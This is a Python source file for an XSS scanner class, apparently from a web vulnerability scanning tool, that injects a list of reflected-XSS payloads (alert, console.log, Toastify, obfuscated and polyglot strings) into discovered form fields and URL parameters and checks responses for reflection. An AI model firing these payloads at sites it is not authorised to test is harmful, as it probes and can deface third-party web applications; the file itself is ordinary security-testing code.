from core.base_scanner import BaseScanner
from core.utils import RequestUtils
from typing import List, Dict, Optional
import logging
from urllib.parse import urljoin

class XSSScanner(BaseScanner):
    def __init__(self, target_url: str, config: Dict):
        super().__init__(target_url, config)
        self.payloads = [
            # Toastify-based notifications
            """<script>Toastify({text:"XSS Test",duration:3000}).showToast();</script>""",
            """<img src=x onerror="Toastify({text:'XSS Found',className:'toast-error'}).showToast()">""",
            """<svg onload="Toastify({text:'XSS Success',className:'toast-success'}).showToast()">""",
            
            # Console-based detection
            """<script>console.log('XSS Test')</script>""",
            """<img src=x onerror="console.log('XSS Found')">""",
            
            # Detection markers
            """<xss id="test"></xss>""",
            """javascript:console.log('XSS')""",
            """'onmouseover="console.log('XSS')" t='""",
            
            # Advanced XSS Payloads
            """<script>alert('XSS')</script>""",
            """<img src="x" onerror="alert('XSS')">""",
            """<svg/onload=alert('XSS')>""",
            """<iframe src="javascript:alert('XSS')"></iframe>""",
            """<input type="text" value="XSS" onfocus="alert('XSS')">""",
            
            # HTML Encoding Variants
            """&#60;script&#62;alert('XSS')&#60;/script&#62;""",
            """&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;""",
            
            # Event Handlers
            """<div onmouseover="alert('XSS')">Hover me</div>""",
            """<img src=x onerror="document.body.innerHTML=''">""",
            
            # DOM-based XSS
            """javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[/+/id=`alert(1)`/]+'>""",
            
            # Obfuscated XSS
            """<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>""",
            
            # Polyglot XSS
            """javascript:'/*\"/*`/*' /*</stript><html><body><svg/onload='+/"/+/onmouseover=1/+/[*/[/+/id=`alert(1)`/]+'>""",
            
            # Exotic Payloads
            """<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;1)>""",
            """<details open ontoggle=alert('XSS')>"""
        ]

    def scan(self) -> Dict:
        tasks = []
        response = self.make_request(self.target_url)
        
        if not response:
            return {'xss': []}
            
        # Test forms
        forms = RequestUtils.extract_forms(response.text)
        for form in forms:
            form_url = urljoin(self.target_url, form['action'] or self.target_url)
            for input_field in form['inputs']:
                if input_field['type'] not in ['submit', 'button', 'image', 'file']:
                    tasks.append({
                        'type': 'form',
                        'url': form_url,
                        'method': form['method'],
                        'parameter': input_field['name']
                    })
        
        # Test URL parameters
        query_params = self.extract_url_parameters(self.target_url)
        for param in query_params:
            tasks.append({
                'type': 'url',
                'url': self.target_url,
                'method': 'get',
                'parameter': param
            })
        
        results = self.run_concurrent_tasks(tasks)
        return {'xss': [r for r in results if r]}

    def execute_task(self, task: Dict) -> Optional[Dict]:
        """Implementation of the required execute_task method"""
        try:
            for payload in self.payloads:
                if self.test_xss(task['url'], task['method'], task['parameter'], payload):
                    return {
                        'url': task['url'],
                        'method': task['method'],
                        'parameter': task['parameter'],
                        'payload': payload,
                        'type': 'Cross-Site Scripting (XSS)',
                        'severity': 'Medium',
                        'evidence': 'XSS payload successfully reflected'
                    }
            return None
        except Exception as e:
            logging.error(f"Error in XSS task: {e}")
            return None

    def test_xss(self, url: str, method: str, param: str, payload: str) -> bool:
        try:
            # Make normal request first
            normal_data = {param: "test123"}
            normal_response = self.make_request(
                url,
                method=method.upper(),
                data=normal_data if method.lower() == 'post' else None,
                params=normal_data if method.lower() == 'get' else None
            )

            # Make request with payload
            data = {param: payload}
            response = self.make_request(
                url,
                method=method.upper(),
                data=data if method.lower() == 'post' else None,
                params=data if method.lower() == 'get' else None
            )

            if not response or not normal_response:
                return False

            # Update detection patterns
            detection_patterns = [
                'Toastify',
                'console.log',
                '<xss id="test">',
                'javascript:console',
                'onerror=',
                'onload=',
                'onmouseover='
            ]

            # Check if payload is reflected without encoding
            if any(pattern in response.text for pattern in detection_patterns):
                if not any(pattern in normal_response.text for pattern in detection_patterns):
                    logging.info(f"Found XSS vulnerability at {url} with parameter {param}")
                    return True

            return False

        except Exception as e:
            logging.error(f"Error testing XSS: {e}")
            return False

    def verify_xss_vulnerability(self, response_text: str, payload: str) -> bool:
        from html import escape
        return payload in response_text and escape(payload) not in response_text

    def extract_url_parameters(self, url: str) -> List[str]:
        try:
            from urllib.parse import urlparse, parse_qs
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            return list(params.keys())
        except Exception:
            return []